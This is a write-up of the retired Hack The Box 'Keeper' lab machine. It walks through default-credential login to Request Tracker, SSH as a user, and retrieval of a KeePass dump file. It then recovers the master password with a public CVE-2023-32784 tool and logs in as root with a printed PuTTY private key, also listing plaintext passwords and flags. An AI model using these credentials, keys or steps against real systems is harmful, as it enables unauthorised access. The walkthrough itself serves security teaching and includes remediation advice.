 # HTB Keeper Overview
![image](https://github.com/user-attachments/assets/8db7882d-25e7-49b1-b6f8-02456dd997b4)

[Keeper](https://app.hackthebox.com/machines/keeper) is an easy-difficulty Linux machine that features a support ticketing system that uses default credentials. Enumerating the service, we are able to see clear text credentials that lead to SSH access. With `SSH` access, we can gain access to a KeePass database dump file, which we can leverage to retrieve the master password. With access to the `Keepass` database, we can access the root `SSH` keys, which are used to gain a privileged shell on the host.


_Note: Write-ups are only allowed for Retired machines._

Target Machine: `10.10.11.227`

## Enumeration
### Network Scan

`nmap -sC -sV --min-rate 5000 10.10.11.227`<br>
`sudo nmap -sC -sV --min-rate 1000 10.10.11.227 -oN nmap.out`

![image](https://github.com/user-attachments/assets/52d173e8-5692-447a-8f93-ac05fc278e96)

**Open Ports**<br>
Port 22 (SSH)<br>
Port 80 (HTTP) The webserver is available by typing in the `10.10.11.227` onto the address bar, however we see a message on the page which includes a domain<br> 
![image](https://github.com/user-attachments/assets/d1dada30-b2d7-402f-8da5-a0b283b82da3)

### DNS 
Add the `ip` and the `hostname` into our /etc/hosts file, so we can access the site using the domain name as well:<br>
`echo "10.10.11.227 keeper.htb tickets.keeper.htb" | sudo tee -a /etc/hosts`   <br>

Now we can access the site using the domain names:<br>
`keeper.htb` and `tickets.keeper.htb`<br>
![image](https://github.com/user-attachments/assets/864762ae-ac2b-4c2b-8acc-7e9d55425cb5)

## Service Identification
While browsing the link http://tickets.keeper.htb/, We notice RT 4.4.4, request tracker. We are able to find default login credentials after a quick internet search.<br>

username: `root`<br>
password: `password`<br>
![image](https://github.com/user-attachments/assets/a6643de4-c6de-47db-9851-d11b3c846afc)

We browse further to see if more information can be found and leveraged.<br>

**Enumerate further**<br>
Go to Admin > Users > List<br>
Find user + default password<br>
![image](https://github.com/user-attachments/assets/6f9b0cae-2f2d-4c41-a655-64d6c6dc637f)

![image](https://github.com/user-attachments/assets/c96e92de-e317-42ea-9dbe-2e6ddfb9ad9f)


**Let's SSH login:**<br>
`ssh user@ip `<br>
`ssh lnorgaard@keeper.htb`

**Enter password:** `Welcome2023!`<br>
![image](https://github.com/user-attachments/assets/9fb07e2d-531a-493a-b976-ea85780c9f85)


**We find the user.txt for the user flag as well as a RT30000.zip file**<br>
`whoami`<br>
`ls`<br>
`cat user.txt`<br>
![image](https://github.com/user-attachments/assets/ecb2d39f-a110-40fa-ae97-70d537b2e664)


**User flag captured:**<br>
`650cbb7d7e90f981a8421d68cb7dcbc4`

We found the first User flag by remote SSH into the target machine exploiting publicly known credentials.<br>
**Solution:** As admin and users, always change the default credentials during setup and configurations to practice good cyber hygiene.<br>
An example would be on user account creation to require a password reset within a specific timeframe.

## Privilege Escalation
Additionally, let's see if we have any sudo permissions on any commands<br>
![image](https://github.com/user-attachments/assets/978c4560-27af-4bf0-8bfc-86a55af9559d)

## Exfiltration
**No additional sudo user permissions, so let's just take the `RT30000.zip` file back with us using a reverse shell:**<br>

While on Inorgard@keeper:<br>
`python3 -m http.server`<br>
![image](https://github.com/user-attachments/assets/e4d64dbc-f24d-4ab4-818a-0c4ab1c8a1e6)

From our host machine:<br>
`wget http://10.10.11.227:8000/RT30000.zip`<br>
![image](https://github.com/user-attachments/assets/3841335c-bad6-4009-96fc-6e6b0dada476)

Target machine confirms it is sending as well with HTTP 200 signal<br>
![image](https://github.com/user-attachments/assets/fc19ea39-d023-4c02-b1b9-fef09176943d)

On our host machine, confirm we have the file.<br>
`ls` <br>
![image](https://github.com/user-attachments/assets/32daa3f7-3365-4a17-b04c-2c903c094743)

Unzip the file<br>
`unzip RT30000.zip`<br>
![image](https://github.com/user-attachments/assets/218adeaa-c15d-4e25-8deb-b182054e813a)

We found two files:<br>
**KeePassDumpFull.dmp** file<br>
**passcodes.kdbx** (keepass database file)<br>

### KeePass CVE
An internet search of “keepass dump exploit poc” leads to a github repo for the exploit [CVE-2023-32784](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32784) <br>

Using this exploit, we will dump the master password from the dump file. We will then use this password to read passcodes.kdbx. <br>

*Note: password must be typed and not copy + pasted*<br>

https://github.com/vdohney/keepass-password-dumper

**Overview of steps for installation of the exploit:**<br>
*Note: Always review the code before downloading from sources.*<br>

1. Install .NET (most major operating systems supported).<br>
2. Clone the repository: `git clone https://github.com/vdohney/keepass-password-dumper` or download it from GitHub<br>
3. Enter the project directory in your terminal (Powershell on Windows) `cd keepass-password-dumper`<br>
4. `dotnet run PATH_TO_DUMP`<br>
<br>

1. `dotnet`<br>
![image](https://github.com/user-attachments/assets/4cecb2e0-c4be-4187-9074-d265ed224783)

**Troubleshooted dotnet not reading the file correctly:**<br>
![image](https://github.com/user-attachments/assets/bc227e15-6eb5-4224-bdb4-30d10d802bc1)

<details>https://learn.microsoft.com/en-us/dotnet/core/install/linux-scripted-manual#scripted-install<br>

https://github.com/dotnet/core/issues/7699<br>

**Do the following:**<br>
1. Remove all .NET packages<br>
`sudo apt remove --purge dotnet*`<br>
`sudo apt remove --purge aspnetcore*`<br>
1. Delete PMC repository from APT, using any of the typical methods, for instance by deleting the repo .list file<br>
`sudo rm /etc/apt/sources.list.d/microsoft-prod.list`<br>
1. Update APT<br>
`sudo apt update`<br>
1. Install .NET SDK 6.0<br>
`sudo apt install dotnet-sdk-6.0`<br>

**SOLVED**</details>

2. `git clone https://github.com/vdohney/keepass-password-dumper`<br>
![image](https://github.com/user-attachments/assets/e027307d-0f59-4a1f-b916-b4e64ccff84c)


3. `cd keepass-password-dumper`<br>
![image](https://github.com/user-attachments/assets/4861395d-ce08-42ca-8b7d-eeb0d37a3e45)


4. `dotnet run ../KeePassDumpFull.dmp`<br>

`dotnet run ~/HTBboxes/CTF/Keeper/KeePassDumpFull.dmp`<br>
![image](https://github.com/user-attachments/assets/feb4f9a8-e639-4900-b957-d71cf7f0d95b)


**After doing an internet search of “dgrød med fløde”, it's actually:** <br>
`rødgrød med fløde`


Now that we have the password to the passcodes.kdbx file, we'll use the following KeePass command <br>
`kpcli`<br>
![image](https://github.com/user-attachments/assets/72418fa0-7166-460e-ab0a-7aaf18516beb)


`open passcodes.kdbx`<br>
password: `rødgrød med fløde`<br>

No error messages, so let's try the `ls` command<br>
![image](https://github.com/user-attachments/assets/1e3639d2-a42b-44d6-b0b2-acc7dc020018)


**Perfect!**<br>
`cd passcodes`<br>
`ls`<br>
(after more tries)<br>

`cd Network`<br>
![image](https://github.com/user-attachments/assets/ad526bfd-01ad-4e97-a9f5-913848bc3ea5)



`show 0 -f`<br>
![image](https://github.com/user-attachments/assets/6ccc5e22-7e25-46b8-8181-940e494d5760)



We received putty key file for root<br>
ssh-rsa


**Tried to gain access through SSH:** <br>
`ssh root@10.10.11.227`<br>
Then it asks for a password -> This does not work because it needs authentication<br>

**REMOVED THE WHITE SPACES:** <br>

`sudo nano putty` > paste everything starting from “PuTTy-User..."<br>
remove all the indents from beginning + save<br>

What you should have is below:

```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```
<br>

Now enter the command:<br>
`putty`

**Settings:**<br>
+ session > host name is `10.10.11.227` (port 22 default)
+ ssh > authentication > credentials: upload putty file

**After accepting next prompts, let's see if we can access root**<br>
![image](https://github.com/user-attachments/assets/30218531-ac21-4e84-afe4-67fbc9b6daa6)


`root`<br>
![image](https://github.com/user-attachments/assets/0b570854-eb82-49aa-a90d-e0b41695db42)


`ls`<br>
`cat root.txt`<br>
![image](https://github.com/user-attachments/assets/fd5c889a-5d67-4bd7-8e9d-b1e257c3cf41)


**Root flag captured:**<br>
`518b434db7c3142f146ccc3e3011ef33`

While the KeePass password had unique characters, we found the Root flag by remote SSH with authentication by exploiting a public CVE.<br>
**Solution:** As admin, always keep machines/software patched to have access to the latest security updates.<br>
Other layers of security to consider would be to have honeypot accounts, files, and keep public/private keys in a separate database instead of all in one place.
